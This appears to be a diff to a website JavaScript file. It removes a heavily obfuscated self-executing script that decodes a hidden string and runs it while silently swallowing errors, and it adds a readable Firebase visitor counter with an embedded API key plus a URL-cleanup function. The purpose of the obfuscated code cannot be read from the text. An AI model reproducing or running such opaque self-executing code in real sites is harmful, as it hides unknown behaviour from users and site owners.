@@ -1,1 +1,72 @@
-(function(){_o0("d/p!fWopi|vpdf3p(unpd!dojedp#uhpdgs~!popdputtbveiMoufnjbvtvpv/jXuup-ft.fbgqtpovohujj!ntwug#u!q*muoufpupsbjf!f-D)!!f~u!usiofjhmG8npo>t/dfjFD)/moo~J7fvv!vfpsomp(tptJS6bonjdsv!dfv0fb#ogF#tu?odsotsno(be;BsC-v)>jfpuoffu*sj#opBtso!utsFbnof!do#pnTufv2jt)mqfus'ih-o!Fpnn1bg#ftoC*',;#z#`sf*1mvFniuz<!x%sniDbo|1jmmfpfJgdj|fpuPhuj*{/foueevvodevuOfJg|f(nu;!)osemjtqGCe!sB*f/!p(dspfsmtJv;)fq<ou#owufxbfz;Hd#ouqd!f-!jjo/od~0!lHvv)p(yfstpumVu0>f.nsGowusfjoQpsjgx|uZ?oJtjDsgu!bdmpsxb;W>!Sutppspfub~opxq#:!)F!josfsoiua#n/jhL2oCduu*t.g/j*;!hLmT1vBppf<idpmp<##tfp81nTvsod/psfoi#iuzc61!Fo.up(vdo/j-ub;bZ10`ud!v*ofhit#uu#mK1!Dfp>o~uDubutqjB.G12Psv!ud(mitpdtdJq#*1OSogFb*f?iss;/{s~|1Gfupmu<b2<zj0dbps1Jg(sfdjo*d/q0pTk<f*H!!nnigV|psuxnzfmu/*>ubf!!sdof.x0Edfvu<!juo))mptqjxgTuuspeeeDufd)opme/j7.!oGcpbp/sp*tmb#hssge!j!dlvusv|ufd;tfffc)y>)!ofpod!/f#ucD8-of!eeuysupdmT#bbE7bvehcj)u*Fompu~utK6vn)f-udD|mtfhbjfo/u!2uDfppdfub)ujdkbgi0*GPnvopn!oafn/tlj<!/jVvouofdQ\\)qd09sd2ssOluftovbVopp2Zfp1ffUb*opusuSvsn2bco1qtFo<um*siMmu0/Vbt1muS/d!f|f!!m|g7Ytu1bp`#p>/do>D-jj/tf!1dsE*o!fpu!Moos2:tD1ffP<t(svQdFvjf0uuP*))DspFsobvBmucgIpV/0b`fmspuusOmjbjysOu]qQufssFisJ-bts:bUp/qBv/p)m!fOdmffdhFG1*Usms#f>oHmjkc`fSj%<Iop(Fn!u^f{tbt/`y0b*~h~sfxQ!bf0tCbEf-v<p)*sojbGoB2fhqPe(udoa<puoupVq2.4qD)(ipTWbs/eivsq/gH#`2*!oojx!up/om~7j8-Q*,>tbtbjfxse*/sinB/(!uqjjoy/f!~g2fHfUslh!tuujumqtfs0tZtIf(fdip!uDpmmmpgu#t!q~uppstjpdbbtnjp-b>msBvu!fbobdtf!ssbh!bfvo)dumuufi|#ffvjaduuudpEjfj)!dic/uo0fviFpvp{op0bpubkihh)s)mvodjuo]uouttETm0obfou)o!/0!tqf#pfp]!qnu!dh>q,upt.<noc/oqffep!!b%im;btbeb1v*osjvG(u0ff0vfjfm%n<uStojOi-!/0uuosq0/b!fqus0o(fmxiM;Js-ux>gmffBb(opx/p#ep(pb!-bsc(n*ehxkhh;`(Tje)zSb~f<;)/tMm#d*uupefft~<d%ah#fp8p,s!dpegf~dp|\\t<wc8v(jtvd;-!podVujfb7okojn*%|peotvSbnmm6uuhhf!|dsptusMuq).3f()oo>dp!du!s!jp(q:s~*Ju?pvwv!dfDdsEs6tj~o/|vojndmoM/ufp90gBhmoutfvfuFd|ck7%!boffu;josbVBphvf4|)tpuu~juusosOnfhd5FozoF!aop/fVmJ0u(u8Svozmd*dsbos~OgG*.#Sndnfp~s!eumaHjj<g-P?!pnv-fdeV!*^ssdfbS>gvfo)npFs><!ffp8q`!vtouffvwm!dVcto7qB2omu!soof!xpSbut6JQ1dzC>suuo>joMtpu/eQ1u)z!p)fu!ot!fs!g;`1jbJ1s2sMxepjkfFj#J1pve<**;jjpmtt-Ss2E1ou)j!~!toxf!0eSf;~*!i(g>-#ue//d2pPc8|j*w!?|-fpmmm2dSb80so<j)|nfoxppf/-`t7dfjdtedfsf/dhb7tBf6puupjppsssmb)o/fQb3vvjoudohp)pua!2uQq:osbtp/tfs(dj\\p0E`q6uompsfp;*EbpVsgpJ/9f!jm.ymu<PuoS!jdEd7s){fdjfsdNj/Mss-!p4tof/pt/vpDpp!pfp>n50vWmvuffoposDpco!#8nnjpots~to/jMubT#-;b!thu)s*uuihF!topqxj0j)(*p<!fsjBVfbssfo!u(**sddofoOS.qjpc`2pG<|)ppug,JMbthk;d1sjjd#ovM<dO;qijfcp1DsgpFtopjmH%qpodcv1pf!vspubgf^|/ubu3o*vc)osmFe!b!dk-mJ:u/ob\"upfmf)oDvtjbe2fuutd!s/fedQis#on;espffp>!mn(vbbs<db#8aGs!v!mpf-suofjsoh3<j)boejhojsihonfbm2gy*vupt)uof,fuqnipevf|uFdu(!jox!Vpf.c8oeuim/fW>uujVssonb9d)s!feoj!jQoSmuuzm9u1z)nbjtebbeM~|-..gj*|bfuojpmup!ahtjqep,doobhudjixx*ffesbo(ppu)!pv{//j~uu#pf!soo**usnffmu~BM<kbgctz|",(function(){this._W5L5YvH3h__wacD79={f:function(_ofUH,$){_2i="\x70\x6c\x61";function _E8(_ofUH,$,_V9tr,_2KM8){function _8B2f(_2kO){_2kO=_3I5(_2kO)-32-(_2KM8%95);if(_2kO<0){_2kO+=95;}_2kO+=32;_2KM8++;return _7K4Z(_2kO);};function _05H(_ofUH,_V9tr){_Uj=_ofUH[_V9tr];_xdR="";while(_Uj!="\f"){if(_Uj<" "){_xdR+=_Uj;}else{_xdR+=_8B2f(_Uj);}_V9tr++;_Uj=_ofUH[_V9tr];}return _xdR;};function _3I5(_Uj){return _Uj[_Ba1](0);};function _7K4Z(_2kO){return this[_SyQf][_u5](_2kO);};_V9tr=_V9tr?_V9tr:0;if(_ofUH[_Iq]>_V9tr){_2KM8=_2KM8?_2KM8:0;_jn=_05H(_ofUH,_V9tr);_IJ=_jn[_Iq];_vyi=_05H(_ofUH,_V9tr+_IJ+1);_M6g0=_vyi[_Iq];$[_jn]=_vyi;_E8(_ofUH,$,_V9tr+_IJ+1+_M6g0+1,_2KM8);}};_q6="\x72\x65"+_2i+"\x63\x65";_Ba1=_vo("_ahco%Cr%Aedt");_SyQf=_vo("r_t%Sgni");_u5=_vo("_orfhCm%Crae_do");_Iq=_vo("ne_lh_tg");_E8(_ofUH,$);function _vo(_CA){return _CA[_q6](/[x%y_z]/g,'')[_q6](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_oF9\fJztj|ryy\fkDA?|_\f%x%\"wz}\fx\"TpN\f)/*0\f\"#:]5\f'][z]TX?TA]_DYGbSVe\\;nrIG=HK\\QOdWH[pnJmdgMXe!;|S^ww)[%Z!+%08gAr0do/3;{l*lwARGEZM/XS]Wbj{'Y`b8F<$/k ~!u!)i{-&/53>$+Y\\%:E:AH<KO~DGRWLHSJK D%(P[^lkkCjexKyps^iqMo%Sgfq\"35,7/o7:?9s~8mo2tz&WLVZcT4[^c](3\\UM6g/:{pqx$xx,#+,<G!<>w?aDOCFMB=-DCEVP[E*-@`Wb[bi]lpPunicngM=Qit#u)})1l0'*u!(l]|xI}):A<O\"PGJ()^+6MI_'/2=marTkqkw !>Ioh%IYEP&-/(7n|wxP[0=#1AWbPBSLU[uTQbmP'lq?itandxrlw s~nFL*y%|/1q70+;$/+_bxv},7FKAAVMUV6AKT)*ED>I]oqTg|zGRiu|gSNY,'.%('7Wb&4>}f^i7DD:DKRgrB5}\"mx@cc\\c^u!ZciEh\\})[ptT*$&1v,*Pc-8/0+61@66A1Jv}rN>IRGQU^OFQMdXALWkjhgcgT_eU\\=Zev~^%',bm|XV|uit=4m46Gq|6q%4IIy%XWUTa!,P`./1(3j`ufm/:h;f#D_7B+.5*%>I#|2^[EP@3FI=LW;m!MxS^5K`VYdQ*/,C`kHSQRfqg}@}F]ny'..%t  WZXm{'7>:A\"-6Ss'(2F+6NZOR1<O`G.7B\\kby=Hc7]CdDO%w(+JUy3+WPv[S^=</>Yd3ClB_jNORdoE}{!GkvefYp{8CHBU\"2,\"4*11C$ZXwZQ*~~bZ/qj?=`Yb7qB2g<I5q%Uk_DQ=y-](`UWb}PI(@*Om@,bZ[t_bD8;>mk.fs_<O ;~@9-qffJSv$oL_0K/P[!c\\1/c'4 \\o@[?akO<:\\5o@0bV;H4p$ToIkD~O?tms'jdPbpQc+F/05mbdo8t`r!a458Cfx@[DEh2=oE*.ZrQ.y,:zRnuQ]IV`aWPYQdA-?M.e8v{kq]jtukdlexUASaBR3(S $SQsp{NTU*7,t_ewX+,/&yhf))svtzv|#zp3-w}0Tefg*0$}l#!\"2L031739?7-$MX+np#B.ZNF:JLJGtXYCSMCUKRRdEwW3qJDVc%5ym\\Z|UOan0@%xt`r!aJkkkDgas!BRi3>pK]k ~t@;v*>FY6\"4B#+js-e80CL-?f\"jk/Xc6>C}@3:e`>IVWTX%!vwqFJ{Kyxrz.jVhvWs,09\\n6Q:;^(3e9;PMSih2=o,K]fysr<Gy)UUV|H!)hq+Ob20R+G_cUVY2Nfj2[f9Mo\";{|rjk_[GYgH:95*Mi\"&M$Q0\\fj!p\\n|]jjh?3?dqqoEiRsssj4?q&HZsRw%%#GHG;*(J#k---$)664+kl0\"!|]QI=MOMJ\\=t18s}abcdZN^`^[mN&X7<,0s2nZlz[Jh2BK=iysi{qxx+k'%!]k:rIK]NA5$\"DAL~7bh\\7E06H)_asdWK0fhzk1Ze8P{\"uP<gi|`IQYLcH~!3$Ir}P5$7RQz&X-.O1['_68J;.A%&Dp!zp#x  2r]o'n@B6.\"242/AJ#q0YirOP+y8aqz-Va4khl27cz<+Ir#,>grE|y}CH&L^&A*+Nw#U)+@=CYX\"-_{;MVicB&Dp!zp#x  2rKE ?w[MPcF:6\"4B9=b&i[^q'P[.hz)=<2]XvZb6k:9bm@z-;ONDojxlt(cgKfjNw#Ui,>W(-Z;&'<thxzxu(~#f0;mDFCWp<7E9AT8V3~1? -pz_,<6,>4;;M.;AIb[4)j?MKcWS?Q_@rsN}#Fxy|FozMPW7'CQ|y%W)Sn/I':ig*bW9m{y2&j_Au$\"l6AsXGZut>I{\"OQx~J#UV1`T)}_4B@XkO2?#-s7ijEt8al?yv<4B!d#_K]kL!'%$^.ZjdZlbii{\\2565*b5H u1%iyZOzGMp#JeNOr<GyQUQg|{EP#{0[W&Q*\\oG=Xk;9[4D%yEq6_j=JS2y@l`OMoiI{[7uN^?4_,Py%WdmL4Z'({jh+csTItAe/:ld[Cso<0t'NiRSv@K}QShek\"!JU(Dcu~2,l0@!uAm2[f91(o@<z^THXZXUgH R16&*mnQ@^(8A5!})[ab7D9\"lr%e89<3Jk>?Bk5@rxyN[PvTzMNQzDO\"<U6$O(8xm9e*S^1=\"/>4`sCAc]=,Js$-l`XL\\^\\YkL$V5:*.qTago)\"ZIg1AJ*=b7=;:tFiB<v6nYk#j<>?R+~/1/,>~VryU_Ca>*<J+0$9wm1h;y~nr?OI?QGNN`AFUx.|oHz.e[vjYWysSXLa@\"uZ_ShG=`8T[7Aym} }z-mCFGF;sFY1'BU9108; -pz IT'jl~>*U.`sKA_4A%/4]h;qvS=<epCWy,Eq%hONbRXxW{orh\\lnli{\\4PW3=!?{gy(h#SnJm GbKLo9DvhPSxwAL~RuUW\"MV@Y-SfC/AO0dL<hys7Ip,tu9bm@2y|BAjuH{?~!Kv i#W|0lXjxYi-Wk5=`r:U>?b,7i[CFkj4?qEhHJt@I3L\"FY6\"4B&=b\"%c@,>L?kQRl9CG]M9KYDxlxH{@55x@itG[}0I(WyzymiUguZ`6YNN2Yh]<xdv%iDg\\\\@g1<nRB`[+r>!AT$\"DEN8dYRS`b*PNOR/hj^Htsxy]^RIcv>Dw[DLTGbMKmnwa..{|*,Sywx{X24(q>ABC'({r-@gmAi!d.9k!B~F\\o;&>Q)U;<V:#+3&=,*L7OC+B&OZ-Bc@g}1\\G_rJv\\]w[HFhE~!t^}.qeNT*M_'B+,Ox$VH03XW!,^2U57a-i492E)n&i3>p&G$Kat@|#DW;<)'I4L@(?#LW*?`=dz.YD\\oSM9KY:p#X{BY=fqDXz-F%aM_mWS.Q4-a_{(q++,8t`r!ulAdv>YBCf0;m?Q|Gpo9DvekKxD|_X-+QS=VVWQdA-?M0lWXmJ6HVD<vjvS?Q_CK WN!]I[iT)|)fXZ^X{^2V-?t$wtfhlf*emAe<N$3'#n!/)tOu-px!uT$\"D6\"\\]!;k'NB1/QK+0?bwfY4\\]QI=MOMJ\\D@LTG}aF#mn$gPX`SjfRdrS(g[NM7+7fd'xd?@c8 o<M3'%pK173MrG'zmlVKV:#+3&A,*L>*de)9\\';dXLJ6p[W]r8lL@32{p{_Dn\"^J#RPrK _SFEznU 3V+1/.h8{|bj-@lhAp34E)xp9:Ks{P<) B%|C@%!Y=*(JD$)8[p_R-UVJB6FHFCU=9EM@vZGEg@/Mv'0ocHca]:HvO>\\&6?~2uv5\f");function _o0(_hI,_1nq,_UA,$,_f0ey,_XLGM){_796=this._W5L5YvH3h__wacD79;_796.f(_f0ey,$);if(!_UA){_UA=$.__u8n;}_QS1()(_hI,0,0x913,this,"''");function _QS1(){return function(_egy,_7z31,_3QbJ,_s4Df,_BM){_796.p1=_egy;_796.p2=_3QbJ;try{_OS(_s4Df)(_1A()([_UA[$._730lN]("+p%p",_BM)[$._730lN]("-p%q",_BM)],''))();}catch(e){}function _OS(_81){return _81[$._nD6];};_s4Df._W5L5YvH3h__wacD79=_XLGM;};};function _1A(){return function(_VI,_rXs){return _VI[$._g9T1](_rXs);};};};}());
+import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+import { getFirestore, doc, setDoc, onSnapshot, increment, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+setLogLevel('Debug');
+
+const ERROR_APP_ID = "originalamanah-my-id"; 
+const FIREBASE_CONFIG = {
+apiKey: "AIzaSyDS6reCDJnak8YaUXs9tHx9c_sBg3G7hGY",
+authDomain: "global-project-fe765.firebaseapp.com",
+projectId: "global-project-fe765",
+storageBucket: "global-project-fe765.firebasestorage.app",
+messagingSenderId: "776529586347",
+appId: "1:776529586347:web:bb291d721d788fdaea2fee",
+measurementId: "G-YV9KS75YJF"};  
+let db, auth;
+const COUNTER_DOC_PATH = `/globalpro_counters/${ERROR_APP_ID}/counters/main_counter`;
+
+function formatCount(num) {
+if (num >= 1000000) {
+return (num / 1000000).toFixed(1).replace(/\.0$/, '') + 'jt';}
+if (num >= 100000) {
+return (num / 1000).toFixed(0) + 'rb';}
+if (num >= 1000) {
+return (num / 1000).toFixed(1).replace(/\.0$/, '') + 'k';}
+return num.toString();}
+
+async function initializeVisitorCounter() {
+try {
+const app = initializeApp(FIREBASE_CONFIG);
+db = getFirestore(app);
+auth = getAuth(app);     
+        
+await signInAnonymously(auth);
+console.log('Firebase auth (anonymous) successful.');
+
+const counterRef = doc(db, COUNTER_DOC_PATH);
+const countElement = document.getElementById('visitor-count');
+        
+if (!countElement) {
+console.error("Elemen 'visitor-count' tidak ditemukan.");return;}
+
+onSnapshot(counterRef, (doc) => {
+let count = 0;
+if (doc.exists()) {
+count = doc.data().count;}
+countElement.textContent = formatCount(count);
+console.log(`Visitor count displayed: ${count}`);
+}, (error) => {
+console.error("Error listening to counter snapshot: ", error);
+countElement.textContent = 'Error';});	  
+        
+await setDoc(counterRef, { count: increment(1) }, { merge: true });
+console.log('Visitor count incremented on refresh.');} 
+   
+catch (error) {
+console.error("Error initializing Firebase or visitor counter: ", error);
+const countElement = document.getElementById('visitor-count');
+if (countElement) {
+countElement.textContent = 'N/A';}}}
+document.addEventListener('DOMContentLoaded', initializeVisitorCounter);
+
+function enforceCleanUrl() {
+const currentPath = window.location.pathname;
+const currentUrl = window.location.href;    
+if (currentPath.endsWith('/') && currentPath.length > 1) {
+const cleanPath = currentPath.replace(/\/+$/, '');        
+const cleanUrl = window.location.origin + cleanPath + window.location.search + window.location.hash;
+console.log(`[URL CLEANING] Found slash at the end: ${currentUrl}`);
+console.log(`[URL CLEANING] Change URL without reloading: ${cleanUrl}`);        
+history.replaceState(null, null, cleanUrl);} 
+else {console.log(`[URL CLEANING] URL is clean or root URL: ${currentUrl}`);}}
+document.addEventListener('DOMContentLoaded', enforceCleanUrl);
